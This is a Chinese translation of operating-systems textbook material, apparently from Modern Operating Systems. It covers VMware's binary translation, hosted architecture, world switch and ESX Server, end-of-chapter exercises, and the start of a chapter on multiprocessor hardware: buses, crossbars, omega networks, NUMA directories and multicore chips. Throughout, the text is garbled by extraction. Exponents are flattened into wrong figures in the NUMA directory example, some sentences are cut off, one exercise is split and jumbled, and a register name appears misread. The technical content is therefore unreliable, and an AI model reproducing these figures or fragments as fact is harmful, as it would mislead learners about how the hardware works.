例如，以下任意条件成 立时就必须使用二进制翻译子系统：
1)虚拟机当前运行在内核态(x86 体系结构下的特权级0)。
2)虚拟机可以关中断和执行I/O指令(在x86体系结构下即当前特权级具有I/O权限)。
3)虚拟机当前运行在实模式 (BIOS 使用的16位执行模式)下。
第二个关键点是通过适当配置硬件，特别是精心使用x86段保护机制，动态二进制翻译的系统代码 也能以接近原生的速度执行。
这与仿真器通常期望的1/5性能降低有很大不同。
这一差异可以通过比较动态二进制翻译器如何转换一条简单的访存指令来解释。
要软件模拟这样一 条指令，经典的模拟整个x86指令系统体系结构的动态二进制翻译器首先要验证有效地址是否在数据段 的范围内，然后转换成物理地址，最后将引用的字复制到模拟的寄存器中。
当然，这些步骤可以通过缓 存的方式进行优化，就像处理器在TLB中缓存页表映射一样。
但是，即使有这些优化，仍会将一条指令 扩展成一个指令序列。
而VMware的二进制翻译器不会在软件层面执行这些步骤。
它会配置硬件，使这条简单指令能原封 不动地保留在翻译后的指令序列中。
VMware VMM(二进制翻译器是其中一部分)配置硬件使之完全 对应虚拟机的设置，使用影子页表以确保MMU能直接使用而无需模拟，使用与影子页表相似的办法处 理段描述符表(在老式x86操作系统运行16位和32位软件时发挥了重要作用)。
3.虚拟硬件平台
目前为止，主要讨论了与x86处理器虚拟化相关的问题。
但基于x86的计算机远不止是处理器，还有 芯片组、固件以及控制磁盘、网卡、CD-ROM 、键盘的I/O设备等。
虚拟化平台由复用的和模拟的部件组合而成。
复用是指配置硬件以使其可以直接被虚拟机使用，并 在多个虚拟机间(空间上或时间上)共享。
模拟是指向虚拟机提供选定的标准硬件部件的软件仿真。
图 7-9展示了VMware Workstation将复用应用于处理器和内存，将模拟应用于其他设备。
图7-9 早期(2000年左右)VMware Workstation虚拟硬件的配置选项
对于复用的设备，每个虚拟机都像是拥有独占CPU 及从物理地址0开始的固定大小的连续RAM。
从架构上讲，每个虚拟设备的模拟都可以分成虚拟机可见的前端部分和与宿主操作系统交互的后端 部 分 (Waldspurge 和Rosenblum,2012) 。
前端本质上是硬件设备的软件模型，可以由虚拟机中运行的未 修改的设备驱动程序控制。
无论主机上相应的特定硬件是什么,前端总是提供相同的设备模型。
例如，VMware 首个以太网设备前端是AMD PCnet “Lance”芯 片(PC 上一度流行的10Mb/s扩展卡), 而后端提供到主机物理网络的连接。
出乎意料的是，Lance 芯片退出市场之后很久VMware 仍保留对 PCnet 设备的支持，并且实际I/O 比10Mb/s快几个数量级 (Sugerman 等人，2001)。
对于存储设备，最初 的前端是IDE 控制器和Buslogic 控制器，后端通常是主机文件系统上的文件，如虚拟磁盘或ISO 9660镜 像，或者是原始设备，如磁盘分区或物理CD-ROM 驱动器。
4. 宿主操作系统的角色
最后一个要介绍的VMware Workstation的重要设计决策是将其部署到已有操作系统之上。
这一特点 将其归为第二类虚拟机管理程序。
这个选择有两个主要好处。
首先，这解决了外围设备多样性带来的另一部分挑战(虚拟硬件平台已解决了一部分挑战)。
VMware 实现了不同设备的前端模拟，但后端依赖宿主操作系统的设备驱动程序。
例如，VMware Workstation读写宿主机文件系统上的文件来模拟虚拟磁盘设备，在宿主机的桌面上绘制一个窗口来模拟 显示。
只要宿主操作系统有合适的驱动程序，VMware Workstation就能在上面运行虚拟机。
其次，产品能像普通应用程序那样安装使用，对用户而言更容易接受。
与其他应用程序相同， VMware Workstation安装器将组成虚拟机管理程序的文件写入现有的宿主机文件系统，不会扰乱硬件配 置(不用重新格式化磁盘、创建磁盘分区或修改BIOS设置)。
事实上，VMware Workstation安装完成后 不用重启宿主操作系统就能开始运行虚拟机，至少在Linux主机上是如此。
然而，普通应用程序不具有能让虚拟机管理程序复用CPU与内存资源的钩子和API, 而这些对提供 接近原生的性能是必要的。
前面描述的x86虚拟化技术的核心部分只有VMM运行在内核态时才起作用。
VMM需要不受任何限制地控制处理器的方方面面，包括修改地址空间(以创建影子页表)、段描述符表 和所有中断与异常处理程序。
设备驱动程序对硬件有更直接的访问权限，尤其是运行在内核态时。
驱动程序虽然(理论上)可以 执行任意敏感指令，但是在实践中是通过明确定义的API与操作系统交互，不会(也不应该)任意重新 配置硬件。
而由于虚拟机管理程序需要重设硬件(包括整个地址空间、段描述符表、中断与异常处理程 序),因此将虚拟机管理程序作为一个设备驱动程序(在内核态)运行不是明智的选择。
为了应对这些苛刻的要求，VMware 托管体系结构(VMware Hosted Architecture) 诞生了。
如图7- 10所示，虚拟化软件被拆分成三个独立组成部分。
这三个部分有不同的功能，彼此独立运行：
1)用户可以察觉到的用户态VMware程序 (VMX) 。
VMX 执行所有UI功能，启动虚拟机，并执行大 部分设备模拟(前端),向宿主操作系统发起普通系统调用以完成后端交互。
通常每个虚拟机对应一个 多线程VMX进程。
图7-10 VMware的架构及三个构件：VMM 、VMM 驱动程序和VMX
VMware Workstation看起来运行在现有操作系统上，实际上VMX 确实作为操作系统的一个进程运 行。
然而，VMM 在系统级别运行，完全控制硬件，并且不依赖宿主操作系统。
图7-10展示了实体间的 关系：两个上下文(宿主操作系统和VMM) 相互对等，都由用户态和内核态组成。
当VMM 运行时(图 的右半部分),它重设硬件，处理所有I/O 中断及异常，因此可以安全地将宿主操作系统从VMM的虚拟 内存中临时移除。
例如，VMM 将INTR 寄存器设为新值来修改中断描述符表的位置。
反过来，宿主操作 系统运行时(图的左半部分),VMM 和虚拟机都从虚拟内存中移除了。
这两个完全独立的系统级上下文之间的切换称作系统切换 (world switch)。
这个名称本身强调在切 换后软件环境完全不同了，与操作系统实现的普通上下文切换形成对比。
图7-11展示了两种切换的区别。
进程A和B的普通上下文切换交换了地址空间的用户部分，以及两个进程的寄存器，但许多关键系统资 源没有变化。
例如，所有进程的内核部分地址空间相同，异常处理程序也没变化。
相比之下，系统切换 改变了一切：整个地址空间，所有异常处理程序，特权寄存器等。
宿主操作系统的内核地址空间只有运 行在宿主操作系统上下文时才予以映射，切换到VMM 上下文之后就完全移除了，空出来的空间用于运 行VMM和虚拟机。
系统切换虽然听起来复杂，但是可以很高效地实现，只需要执行45条x86 机器指令。
图7-11 普通上下文切换与系统切换的区别
会发生的情况。
当然，这一切能正确执行是因为存在两个独立的上下文以及它们之间的系统切换。
回到图7-10,它还进一步展示了VMM执行时发生磁盘中断(第1步)的各个步骤。
当然，VMM不 能处理此中断，因为它没有后端设备驱动程序。
第2步，VMM 通过系统切换回到宿主操作系统。
具体来 说是返回VMM驱动程序，并在第3步模拟磁盘发出的中断。
第4步，宿主操作系统的中断处理程序运行， 就好像中断是在VMM驱动程序(不是VMM!
) 运行过程中发生的那样。
最终，第5步，VMM驱动程序 将控制流交还VMX进程。
这时，宿主操作系统可以选择调度其他进程，或者继续运行VMware VMX进 程。
如果VMX进程继续运行，就会调用VMM驱动程序，通过系统切换返回VMM上下文，恢复虚拟机 的执行。
可以看到，这个巧妙的花招对宿主操作系统隐瞒了整个VMM和虚拟机。
更重要的是，它允许 VMM按需重新调整硬件。
7.12.5 VMware Workstation的演变
原始VMware虚拟机管理程序开发之后的十年，虚拟化相关技术的状况发生了巨大改变。
相比之下，随着硬件辅助虚拟化的引入，x86 体系结构的虚拟化方法有了显著改变。
Intel VT-x和 AMD-v等硬件辅助虚拟化分两阶段引入。
第一阶段始于2005年，以消除对半虚拟化或二进制翻译的依赖 为目的 (Uhlig 等人，2005)。
2007年起，第二阶段提供嵌套页表形式的MMU硬件支持，消除软件维护 影子页表的需求。
今天，如果处理器支持虚拟化和嵌套页表，VMware 的虚拟机管理程序就可以以使用 基于硬件的陷入并模拟方法为主(40年前即由Popek和Goldberg形式化提出)。
7.12.6 VMware的第一类虚拟机管理程序ESX Server
图7-12展示了ESX Server的高层体系结构。
它结合了已有的VMM部件和一个直接运行在裸机上的
真正的虚拟机管理程序。
VMM 执行的功能与在 VMware Workstation中相同，即在一个复制的x86体 系结构隔离环境中运行虚拟机。
实际上，两款产品 中的VMM基于同一个源代码库，大部分内容是相同 的 。
ESX 虚拟机管理程序替换了宿主操作系统的功 能，但它的目标只是运行各种VMM 实例并有效管理 机器的物理资源，而不需要实现操作系统的完整功 能。
因此，ESX Server只包含操作系统中常见的子 系统，例如CPU调度器、内存管理器和I/O 子系统， 每个子系统都为运行虚拟机而专门优化。
图7-12 VMware的第一类虚拟机管理程序ESX Server
在ESX Server里。
对于用户体验，ESX Server要求用户在启动分区上安装新的系统镜像。
1)CPU 调度器确保每个虚拟机公平地分享CPU (以避免饥饿),还能让多处理器虚拟机的不同虚拟 CPU同时调度运行。
2)内存管理器为伸缩性进行了优化，特别是当虚拟机需要的物理内存总量超过物理机实际内存大小 时，还能保证虚拟机高效运行。
为了实现这一目标，ESX Server首先引入了气球和虚拟机透明页共享 (Waldspurger,2002)。
4)后端通常依赖宿主操作系统提供的抽象，例如VMware Workstation将虚拟机磁盘镜像保存为宿主 操作系统上的普通文件(只是体积很大)。
相比之下，ESX Server具有VMFS(Vaghani,2010), 文 件 系 统专门为保存虚拟机镜像和保证高I/O 吞吐率优化。
这能极大地提升虚拟机的性能。
例如，VMware 在 2011年演示过单一ESX Server每秒执行100万次磁盘操作 (VMware,2011)。
5)ESX Server中引入新功能很容易，即使该功能需要计算机中多个部件进行特定配置与密切协作。
例 如 ，ESX Server引入的VMotion, 这是首个虚拟机热迁移解决方案，能将正在运行的虚拟机从一台运 行ESX Server的机器迁移到另一台运行着ESX Server的机器。
这项工作需要内存管理器、CPU 调度器和 网络栈的相互配合。
7.13 有关虚拟化和云的研究
老的研究主题从未真正凋零，例如Penneman 等人(2013)按照Popek-Goldberg 准则审视了ARM虚 拟化中的问题。
安全(Beham 等人，2013;Mao,2013;Pearce 等人，2013)和节省能耗(Botero 和 Hesselbach,2013;Yuan 等人，2013)都是热门话题。
由于目前相当多的数据中心使用虚拟化技术，数 据中心的机器间的网络连接 (Theodorou 等人，2013)也是一个主要研究主题。
此外，无线网络中的虚 拟化 (Wang 等人，2013a) 也日渐重要。
虚拟化硬件的一个好处是不可信代码能直接而安全地访问页表、TLB 等硬件功能。
基于这一点， Dune项 目(Belay,2012) 提供一个进程抽象而不是机器抽象。
进程可以进入Dune模式，这一不可逆的 转换给进程以访问底层硬件的权限。
尽管如此，进程仍然是一个进程，依靠内核并与之交互，唯一的区 别是改为使用VMCALL指令来进行系统调用。
习题
1.解释为什么数据中心关注虚拟化技术。
间的机器上运行虚拟机管理程序。
2.解释为什么公司会希望在一台已使用了一段时 3.解释为什么软件开发者会在用于开发的台式机
上使用虚拟化技术。
4.解释为什么家庭成员对虚拟化技术感兴趣。
5.你认为虚拟化技术为什么经过很长时间才变得 流行起来?
毕竟，关键论文写于1974年，而 IBM 大型机从20世纪70年代开始就有了必要的 软硬件支持。
6. 列出两类Popek-Goldberg 意义上的敏感指令。
7. 列出三条Popek-Goldberg 意义上的非敏感指令。
8.全虚拟化和半虚拟化有什么区别?
你认为哪个 更难实现?
解释你的答案。
9.如果有源代码，半虚拟化一个操作系统可行 吗?
如果没有源代码呢?
10. 考虑可以同时支持最多n 个虚拟机的第一类虚 拟机管理程序，由于PC磁盘最多有4个主分区， n能大于4吗?
如果能，数据如何保存?
11.简要解释进程级虚拟化的概念。
13.虚拟化对第二类虚拟机管理程序有什么用?
14.为什么会出现二进制翻译技术?
你认为这种技 术有前途吗?
解释你的答案。
15. 解 释x86的四个特权级如何用于支持虚拟化。
16.为什么基于硬件(支持虚拟化技术的处理器) 的虚拟化方法有时候比基于二进制翻译的软件 方法性能更差?
陈述一条理由。
17.举一个例子说明在二进制翻译系统中，翻译后 的代码可能比原始代码运行更快。
18.VMware 每次二进制翻译一个基本块，执行这个 块，再翻译下一个。
能提前翻译整个程序再执 行吗?
如果能的话，比较两种方式的优缺点。
19.虚拟机管理程序和微内核有什么区别?
20.简要解释为什么现实中难以很好地进行虚拟
化?
解释你的答案。
21.在一台电脑上运行多个虚拟机需要大量内存， 为什么?
你能想到什么减少内存使用的方法 吗?
解释你的答案。
22.解释内存虚拟化中使用的影子页表的概念。
24.为什么使用气球驱动程序?
这是欺骗吗?
25. 描述一个气球驱动程序不起作用的情况。
26. 解释内存虚拟化中使用的去重概念。
27. 计算机几十年来一直使用DMA进行I/O, 在I/O MMU出现前这在虚拟化中导致了什么问题?
28.举出在云上而不是本地运行程序的一个优点和 一个缺点。
29.分别举出IAAS 、PAAS 、SAAS的一个例子。
30.为什么虚拟机迁移很重要?
这项技术在什么情 况下有用?
31.迁移虚拟机可能比迁移进程更容易，但仍然比较 困难。
迁移虚拟机的过程中会遇到什么问题?
32.为什么把虚拟机从一台机器迁移到另一台机器比 把进程从一台机器迁移到另一台机器更容易?
33.虚拟机热迁移和另一种迁移方式(冷迁移)的 区别是什么?
34. 设计VMware时考虑的三个主要需求是什么?
35.为什么VMware Workstation刚面世时已有的大 量外围设备会是一个问题?
37.通过网络搜索，找到两个现实中的虚拟装置的 例子。
第8章
Modern Operating Systems,Fourth Edition
多处理机系统
从计算机诞生之日起，人们对更强计算能力的无休止的追求就一直驱使着计算机工业的发展。
ENIAC 可以完成每秒300次的运算，它一下子就比以往任何计算器都快1000多倍，但是人们并不满足。
我们现在有了比ENIAC 快数百万倍的机器，但是还有对更强大机器的需求。
天文学家们正在了解宇宙， 生物学家正在试图理解人类基因的含义，航空工程师们致力于建造更安全和速度更快的飞机，而所有这 一切都需要更多的CPU周期。
然而，即使有更多运算能力，仍然不能满足需求。
过去的解决方案是使时钟走得更快。
但是，现在开始遇到对时钟速度的限制了。
按照爱因斯坦的相 对论，电子信号的速度不可能超过光速，这个速度在真空中大约是30cm/ns, 而在铜线或光纤中约是 20cm/ns。
这在计算机中意味着10GHz 的时钟，信号的传送距离总共不会超过2cm。
对于100GHz的计算 机，整个传送路径长度最多为2mm。
而在一台1THz(1000GHz) 的计算机中，传送距离就不足100μm了， 这在一个时钟周期内正好让信号从一端到另一端并返回。
让计算机变得如此之小是可能的，但是这会遇到另一个基本问题：散热。
计算机运行得越快，产生的 热量就越多，而计算机越小就越难散热。
在高端x86系统中，CPU的散热器已经比CPU自身还要大了。
总而 言之，从1MHz到1GHz需要的是更好的芯片制造工艺，而从1GHz到1THz 则需要完全不同的方法。
获得更高速度的一种处理方式是大规模使用并行计算机。
这些机器有许多CPU, 每一个都以“通 常”的速度(在一个给定年份中的速度)运行，但是总体上会有比单个CPU强大得多的计算能力。
具有 成千上万个CPU 的系统已经很商业化了。
在未来十年中，可能会建造出具有100万个CPU 的系统 (Furber 等人，2013)。
当然为了获得更高的速度，还有其他潜在的处理方式，如生物计算机，但在本章 中，我们将专注于有多个普通CPU的系统。
另一个相关的技术进步是因特网不可思议地快速增长。
因特网最初被设计为一个军用的容错控制系 统的原型，然后在从事学术研究的计算机科学家中流行开来，并且在过去它已经获得了许多新用途。
其 中一种用途是，把全世界的数千台计算机连接起来，共同处理大型的科学问题。
在某种意义上， 一个包 含有分布在全世界的1000台计算机的系统与在一个房间中有1000台计算机的系统之间没有差别，尽管这 两个系统在延时和其他技术特征方面会有所不同。
在本章中我们也将讨论这些系统。
假如有足够多的资金和足够大的房间，把一百万台无关的计算机放到一个房间中很容易做到。
把一 百万台无关的计算机放到全世界就更容易了，因为不存在空间问题了。
当要在一个房间中使这些计算机 相互通信，以便共同处理一个问题时，问题就出现了。
结果，人们在互连技术方面做了大量工作，而且 不同的互连技术已经导致了不同性质的系统以及不同的软件组织。
其次是图8-1b中的系统，许多CPU- 存储器通过某种高速互连网络连接在一起。
这种系统称为消息 传递型多计算机。
每个存储器局部对应一个CPU, 且只能被该CPU 访问。
这些CPU 通过互连网络发送多 字消息通信。
存在良好的连接时，一条短消息可在10~50μs之内发出，但是这仍然比图8-1a中系统的存
储器访问时间长。
在这种设计中没有全局共享的存储器。
多计算机(消息传递系统)比(共享存储器) 多处理机系统容易构建，但是编程比较困难。
可见，每种类型各有其优点。
a)
c)
图8-1 a) 共享存储器多处理机；b) 消息传递多计算机；c) 广域分布式系统
第三种模型参见图8-1c, 所有的计算机系统都通过一个广域网连接起来，如因特网，构成了一个 分布式系统 (distributed system)。
每台计算机有自己的存储器，当然，通过消息传递进行系统通信。
图8-1b和图8-1c之间真正唯一的差别是，后者使用了完整的计算机而且消息传递时间通常需要10~100ms。
如此长的延迟造成使用这类松散耦合系统的方式和图8-1b中的紧密耦合系统不同。
三种类型的系统在通 信延迟上各不相同，分别有三个数量级的差别。
类似于一天和三年的差别。
本章有三个主要部分，分别对应于图8-1中的三个模型。
在介绍每个模型时，首先简要介绍相关的 硬件；然后讨论软件，特别是与这种系统类型有关的操作系统问题。
我们会发现，每种情况都面临着不 同的问题并且需要不同的解决方法。
8.1 多处理机
共享存储器多处理机 (或以后简称为多处理机，multiprocessor) 是这样一种计算机系统，其两个 或更多的CPU全部共享访问一个公用的RAM。
运行在任何一个CPU上的程序都看到一个普通(通常是分 页)的虚拟地址空间。
这个系统唯一特别的性质是，CPU 可对存储器的某个字写入某个值，然后读回该 字，并得到一个不同的值(因为另一个CPU 改写了它)。
在进行恰当组织时，这种性质构成了处理器间 通信的基础：一个CPU向存储器写入某些数据而另一个读取这些数据。
8.1.1 多处理机硬件
1.基于总线的UMA 多处理机体系结构
最简单的多处理机是基于单总线的，参见图8-2a。
两个或更多的CPU以及一个或多个存储器模块都 使用同一个总线进行通信。
当一个CPU 需要读一个存储器字 (memory word)时，它首先检查总线忙否。
如果总线空闲，该CPU把所需字的地址放到总线上，发出若干控制信号，然后等待存储器把所需的字放 到 总 线 上 。
当某个CPU需要读写存储器时，如果总线忙，CPU 只是等待，直到总线空闲。
这种设计存在问题。
在只有两三个CPU时，对总线的争夺还可以管理；若有32个或64个CPU时，就不可忍受了。
这种系统完 全受到总线带宽的限制，多数CPU在大部分时间里是空闲的。
共享存储器
CPU CPU M
总线
a)
私有存储器
CPU CPU M CPU CPU
高速缓存
b) c)
图8-2 三类基于总线的多处理机：a) 没有高速缓存；b) 有高速缓存；c) 有高速缓存与私有存储器
高速缓存上得到满足，总线流量就大大减少了，这样系统就能够支持更多的CPU 。
一般而言，高速缓存 不以单个字为基础，而是以32字节或64字节块为基础。
当引用一个字时，它所在的整个数据块(叫作一 个cache 行)被取到使用它的CPU的高速缓存当中。
每一个高速缓存块或者被标记为只读(在这种情况下，它可以同时存在于多个高速缓存中),或者 标记为读写(在这种情况下，它不能在其他高速缓存中存在)。
如果CPU试图在一个或多个远程高速缓 存中写入一个字，总线硬件检测到写，并把一个信号放到总线上通知所有其他的高速缓存。
如果其他高 速缓存有个“干净”的副本，也就是同存储器内容完全一样的副本，那么它们可以丢弃该副本并让写者 在修改之前从存储器取出高速缓存块。
如果某些其他高速缓存有“脏”(被修改过)副本，它必须在处 理写之前把数据写回存储器或者把它通过总线直接传送到写者上。
高速缓存这一套规则被称为高速缓存 一 致性协议， 它是诸多协议之 一。
还有另一种可能性就是图8-2c中的设计，在这种设计中每个CPU不止有一个高速缓存，还有一个本地 的私有存储器，它通过一条专门的(私有)总线访问。
为了优化使用这一配置，编译器应该把所有程序的 代码、字符串、常量以及其他只读数据、栈和局部变量放进私有存储器中。
而共享存储器只用于可写的共 享变量。
在多数情况下，这种仔细的放置会极大地减少总线流量，但是这样做需要编译器的积极配合。
2. 使用交叉开关的UMA 多处理机
即使有最好的高速缓存，单个总线的使用还是把UMA多处理机的数量限制在16至32个CPU 。
要超 过这个数量，就需要新的互连网络。
连接n个CPU到k个存储器的最简单的电路是交叉开关，参见图8-3。
交叉开关在电话交换系统中已经采用了几十年，用于把一组进线以任意方式连接到一组出线上。
存储器
关闭的交叉点开关
a)
图8-3 a)8×8 交叉开关；b) 打开的交叉点；c) 闭合的交叉点
水平线(进线)和垂直线(出线)的每个相交位置上是一个交叉点(crosspoint) 。
交叉点是一个小 的电子开关，具体取决于水平线和垂直线是否需要连接。
在图8-3a中我们看到有三个交叉点同时闭合， 允许 (CPU, 存储器)对(010,000)、(101,101)和(110,010)同时连接。
其他的连接也是可能的。
事实上，组合的数量等于象棋盘上8个棋子安全放置方式的数量(8皇后问题)。
交叉开关最好的一个特性是它是一个非阻塞网络，即不会因有些交叉点或连线已经被占据了而拒绝 连接(假设存储器模块自身是可用的)。
并非所有的互连方式都是非阻塞的，而且并不需要预先的规划。
即使已经设置了7个任意的连接，还有可能把剩余的CPU连接到剩余的存储器上。
当然，当两个CPU同时试图访问同一个模块的时候，对内存的竞争还是可能的。
不过，通过将内存 分为n个单元，与图8-2的模型相比，这样的争夺概率可以降至1/n。
交叉开关最差的一个特性是，交叉点的数量以n² 方式增长。
若有1000个CPU和1000个存储器我们就 需要一百万个交叉点。
这样大数量的交叉开关是不可行的。
不过，无论如何对于中等规模的系统而言， 交叉开关的设计是可用的。
3. 使用多级交换网络的UMA多处理机
有一种完全不同的、基于简单2×2开关的多处理机设计，参见图8-4a。
这个开关有两个输入和两个
输出。
到达任意一个输入线的消息可以被交换至 任意一个输出线上。
就我们的目标而言，消息可 由四个部分组成，参见图8-4b 。
Module (模块) 域指明使用哪个存储器。
Address (地址)域指
定在模块中的地址。
Opcode (操作码)给定了
操作，如READ 或WRITE 。
最后，在可选的
a) b)
图8-4 a) 一 个带有A和B 两个输入线以及X和Y 两个输出线的2×2的开关；b) 消息格式
Value (值)域中可包含一个操作数，比如一个
要被WRITE 写入的32位字。
该开关检查Module域并利用它确定消息是应该送给X 还是发送给Y。
这个2×2开关可有多种使用方式，用以构建大型的多级交换网络 (Adams 等人，1987; Bhuyan 等 人，1989;Garofalakis和Stergiou,2013 Kuman和Reddy,1987) 。
有一种是简单经济的omega网络，见 图 8-5。
这里采用了12个开关，把8个CPU连接到8个存储器上。
推而广之，对于n个CPU和n个存储器，我们 将 需 要log₂n 级 ， 每 级n/2 个 开 关 ， 总 数 为(n/2)log₂n 个 开 关 ， 比n² 个 交 叉 点 要 好 得 多 ， 特 别 是 当n 值 很 大 时 。
Omega 网络的接线模式常被称作全混洗 (perfect shuffle),因为每一级信号的混合就像把一副牌分 成两半，然后再把牌一张张混合起来。
接着看看Omega网络是如何工作的，假设CPU 011打算从存储器 模块110读取一个字。
CPU 发送READ消息给开关1D, 它在Module域包含110。
1D开关取110的首位(最 左位)并用它进行路由处理。
0路由到上端输出，而1的路由到下端，由于该位为1,所以消息通过低端 输出被路由到2D。
所有的第二级开关，包括2D, 取用第二个比特位进行路由。
这一位还是1,所以消息通过低端输出 转发到3D。
在这里对第三位进行测试，结果发现是0。
于是，消息送往上端输出，并达到所期望的存储 器110。
该消息的路径在图8-5中由字母a标出。
3级
图8- 5 Omega 交 换 网 络
在消息通过交换网络之后，模块号的左端的位就不再需要了。
它们可以有很好的用途，可以用来 记录入线编号，这样，应答消息可以找到返回路径。
对于路径a, 入线编号分别是0(向上输入到1D)、 1(低输入到2D) 和1(低输入到3D) 。
使用011作为应答路由，只要从右向左读出每位即可。
与此同时，CPU 001需要往存储器001里写入一个字。
这里发生的情况与上面的类似，消息分别通 过上、上、下端输出路由，由字母b标出。
当消息到达时，从Module域读出001,代表了对应的路径。
由 于这两个请求不使用任何相同的开关、连线或存储器模块，所以它们可以并行工作。
现在考虑如果CPU 000同时也请求访问存储器模块000会发生什么情况。
这个请求会与CPU 001的 请 求在开关3A处发生冲突。
它们中的一个就必须等待。
和交叉开关不同，omega 网络是一种阻塞网络，并 不是每组请求都可被同时处理。
冲突可在一条连线或一个开关中发生，也可在对存储器的请求和来自存 储器的应答中产生。
人们希望各模块对存储器的引用是均匀的，为此通常使用一种把低位作为模块号的技术。
例如，考 虑一台经常访问32位字的计算机中面向字节的地址空间，低位通常是00,但接下来的3位会均匀地分布。
将这3位作为模块号，连续的字会放在连续的模块中。
而连续字被放在不同模块里的存储器系统被称作 交叉 (interleaved) 存储器系统。
交叉存储器将并行运行的效率最大化了，这是因为多数对存储器的引 用是连续编址的。
设计非阻塞的交换网络也是有可能的，在这种网络中，提供了多条从每个CPU到每个 存储器的路径，从而可以更好地分散流量。
4.NUMA 多处理机
单总线UMA多处理机通常不超过几十个CPU, 而交叉开关或交换网络多处理机需要许多(昂贵) 的硬件，所以规模也不是那么大。
要想超过100个CPU 还必须做些让步。
通常， 一种让步就是所有的存 储器模块都具有相同的访问时间。
这种让步导致了前面所说的NUMA 多处理机的出现。
像UMA一样， 这种机器为所有的CPU提供了一个统一的地址空间，但与UMA 机器不同的是，访问本地存储器模块快 于访问远程存储器模块。
因此，在NUMA 机器上运行的所有UMA程序无须做任何改变，但其性能不如 UMA机器上的性能。
所有NUMA 机器都具有以下三种关键特性，它们是NUMA与其他多处理机的主要区别：
1)具有对所有CPU 都可见的单个地址空间。
2)通过LOAD 和STORE 指令访问远程存储器。
3)访问远程存储器慢于访问本地存储器。
在对远程存储器的访问时间不被隐藏时(因为没有高速缓存),系统被称为NC-NUMA(No Cache NUMA, 无高速缓存NUMA) 。
在有一致性高速缓存时，系统被称为CC-NUMA(Cache-Coherent
NUMA, 高速缓存一致NUMA)。
目前构造大型CC-NUMA 多处理机最常见的方法是基于目录的多处理机 (directory-based
multiprocessor) 。
其基本思想是，维护一个数据库来记录高速缓存行的位置及其状态。
当一个高速缓存 行被引用时，就查询数据库找出高速缓存行的位置以及它是“干净”的还是“脏”的。
由于每条访问存 储器的指令都必须查询这个数据库，所以它必须配有极高速的专用硬件，从而可以在一个总线周期的几 分之一内作出响应。
我们通过一个例子来具体考虑多个处理机的想法， 一个256个节点的系统，每个节点包括一个CPU 和通过局部总线连接到CPU上的16MB的RAM。
整个存储器有2³²字节，被划分成22个64字节大小的高速 缓存行。
存储器被静态地在节点间分配，节点0是0~16M, 节点1是16~32M, 等等。
节点通过互连网络 连接，参见图8-6a 。
每个节点还有用于构成其2⁴字节存储器的28个64字节高速缓存行的目录项。
此刻， 我们假定一行最多被一个高速缓存使用。
为了了解目录是如何工作的，让我们跟踪引用了一个高速缓存行的发自CPU 20的LOAD指令。
首先， 发出该指令的CPU把它交给自己的MMU, 被翻译成物理地址，比如说，0×24000108。
MMU 将这个地址 拆分为三个部分，如图8-6b所示。
这三个部分按十进制是节点36、第4行和偏移量8。
MMU 看到引用的 存储器字来自节点36,而不是节点20,所以它把请求消息通过互连网络发送到该高速缓存行的主节点 (home node)36上，询问行4是否被高速缓存，如果是，高速缓存在何处。
节点0 节点1 节点255
a)
位 8 18 6
b)
c)
图8-6 a)256 个节点的基于目录的多处理机；b)32 位存储器地址划分的域；c) 节点36中的目录
当请求通过互连网络到达节点36时，它被路由至目录硬件。
硬件检索其包含21⁸个表项的目录表(其 中的每个表项代表一个高速缓存行)并解析到项4。
从图8-6c中，我们可以看到该行没有被高速缓存，所 以硬件从本地RAM中取出第4行，送回给节点20,更新目录项4,指出该行目前被高速缓存在节点20处。
现在来考虑第二个请求，这次访问节点36的第2行。
在图8-6c中，我们可以看到这一行在节点82处 被高速缓存。
此刻硬件可以更新目录项2,指出该行现在在节点20上，然后送一条消息给节点82,指示 把该行传给节点20并且使其自身的高速缓存无效。
注意，即使一个所谓“共享存储器多处理机”,在下 层仍然有大量的消息传递。
让我们顺便计算一下有多少存储器单元被目录占用。
每个节点有16 MB的RAM, 并且有21个9位的
目录项记录该RAM。
这样目录上的开支大约是9×218位除以16 MB, 即约1.76%,一般而言这是可接受
5. 多核芯片
随着芯片制造技术的发展，晶体管的体积越来越小，从而有可能将越来越多的晶体管放入一个芯片 中。
这个基于经验的发现通常称为摩尔定律 (Moore's Law),得名于首次发现该规律的Intel 公司创始人 之一Gordon Moore 。
Intel Core 2 Duo系列芯片已包含了3亿数量级的晶体管。
1974年，Intel 的8080芯片 包含了2000多个晶体管，而至强Nehalem-EX 处理器包含超过20亿个晶体管。
另一个选择是将两个或者多个完整的CPU, 通常称为核 (core), 放到同一个芯片上(技术上来说是同一 个小硅片) 。
双核、四核和八核的芯片已经很普及了，甚至可以买到带有上百个核的芯片，并且还有更多
核的CPU正在研发中。
在多核芯片中，缓存仍然是至关重要的，并且遍布整个芯片。
例如，英特尔至强 2651拥有12个物理超线程核，24个虚拟核。
这12个物理核中的每一个都有着32 KB的L1指令缓存、L1 数 据缓存的32 KB 和256 KB的L2缓存。
最后，12个核共享30 MB的L3缓存。
虽然CPU可能共享高速缓存或者不共享(如图1-8所示),但是它们都共享内存。
考虑到每个内存字 总是有唯一的值，这些内存是一致的。
特殊的硬件电路可以确保在一个字同时出现在两个或者多个的高 速缓存中的情况下，当其中某个CPU修改了该字，所有其他高速缓存中的该字都会被自动地并且原子性 地删除来确保一致性。
这个过程称为窥探 (snooping)。
这样设计的结果是多核芯片就相当于小得多处理机。
实际上，多核芯片时常被称为片级多处理机 (Chip-level MultiProcessors,CMP)。
从软件的角度来看，CMP 与基于总线的多处理机和使用交换网络 的多处理机并没有太大的差别。
不过，它们还是存在着一些不同。
例如，对基于总线的多处理机，每个 CPU 拥有自己的高速缓存，如图8-2b以及图1-8b的AMD 设计所示。
在图1-8a所示的Intel使用的共享高速 缓存的设计并没有出现在其他的多处理机中。
共享二级高速缓存会影响性能。
如果一个核需要很多高速 缓存空间，而另一个核不需要，这样的设计允许它们各自使用所需的高速缓存。
但另一方面，共享高速 缓存也让一个贪婪的核损害其他核成为可能。
CMP 与其他更大的多处理机之间的另一个差异是容错。
因为CPU之间的连接非常紧密，一个共享模 块的失效可能导致许多CPU同时出错。
而这样的情况在传统的多处理机中是很少出现的。
6.众核芯片
超大量核带来的另一个问题是，用来保持缓存一致性的机制会变得非常复杂和昂贵。
许多工程师担 心缓存的一致性可能无法扩展到上百个核，一些人甚至建议彻底抛弃它。
他们担心硬件上保持缓存一致 性的开销会很高，以至于这些新增的核并不能带来多大的性能提升，因为处理器一直忙于维护缓存状态 的一致性。
更糟糕的是，保持缓存目录的一致性还将会消耗大量的内存，这就是著名的一致性壁垒。
我们以上面讨论的基于目录的缓存一致性解决方案为例进行讨论。
